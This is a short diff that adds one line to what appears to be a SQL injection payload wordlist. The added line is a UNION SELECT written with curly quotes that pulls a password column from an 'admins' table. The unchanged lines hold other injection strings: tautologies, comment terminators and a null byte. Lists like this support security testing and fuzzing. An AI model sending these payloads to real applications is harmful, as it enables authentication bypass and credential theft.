@@ -42,6 +42,7 @@
 ' OR 'x'='x
 ' AND id IS NULL; --
 '''''''''''''UNION SELECT '2
+‘ UNION SELECT ‘passwd’ AS password FROM admins WHERE ‘1’=’1
 %00
 /*…*/ 
 +		addition, concatenate (or space in url)
